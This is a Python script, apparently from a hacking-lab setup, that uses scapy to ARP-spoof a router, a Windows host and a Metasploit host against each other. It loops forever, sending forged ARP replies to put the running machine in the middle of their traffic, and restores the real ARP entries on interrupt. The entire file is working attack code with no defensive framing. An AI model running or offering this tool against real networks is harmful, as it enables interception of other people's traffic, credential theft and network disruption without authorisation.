import scapy.all as scapy
import time
import sys
from optparse import OptionParser

def get_arguments():
    parser = OptionParser()
    parser.add_option("-i" , "--rt" , dest="IP1" , help="Enter the ip address of router")
    parser.add_option("-w" , "--win" , dest="IP2" , help="Enter the ip address of windows")
    parser.add_option("-m" , "--ms" , dest="IP3" , help="Enter the ip address of Metasploit")

    (options , args) = parser.parse_args()
    if not options.IP1:
        parser.error("Please specify the IP address of router to scan the network")
    elif not options.IP2:
        parser.error("Please specify the IP address of windows to scan the network")
    elif not options.IP3:
        parser.error("Please specify the IP address of Metasploit to scan the network")
    else:
        return options

def get_mac(ip):
    arp = scapy.ARP(op=1 , pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp
    answered_list = scapy.srp(packet , timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 , pdst=target_ip , hwdst=target_mac , psrc=spoof_ip)
    scapy.send(packet , verbose=False)

def restore(dest_ip , source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2 , pdst=dest_ip , hwdst=dest_mac , psrc=source_ip , hwsrc=source_mac)
    scapy.send(packet , verbose=False, count=4)

try:
    options = get_arguments()
    sent_packet_count = 0
    while True:
        spoof(options.IP1 , options.IP2)
        spoof(options.IP2 , options.IP1)
        spoof(options.IP1 , options.IP3)
        spoof(options.IP3 , options.IP1)
        spoof(options.IP2 , options.IP3)
        spoof(options.IP3 , options.IP2)

        sent_packet_count = sent_packet_count + 6
        print("\rpacket_count : " + str(sent_packet_count)),
        time.sleep(2)
        sys.stdout.flush()
except KeyboardInterrupt:
    print("\nCTRL + C is pressed..........................................quitting and restoring real mac address and ip address")
    restore(options.IP1 , options.IP2)
    restore(options.IP2 , options.IP1)
    restore(options.IP1 , options.IP3)
    restore(options.IP3 , options.IP1)
    restore(options.IP2 , options.IP3)
    restore(options.IP3 , options.IP2)

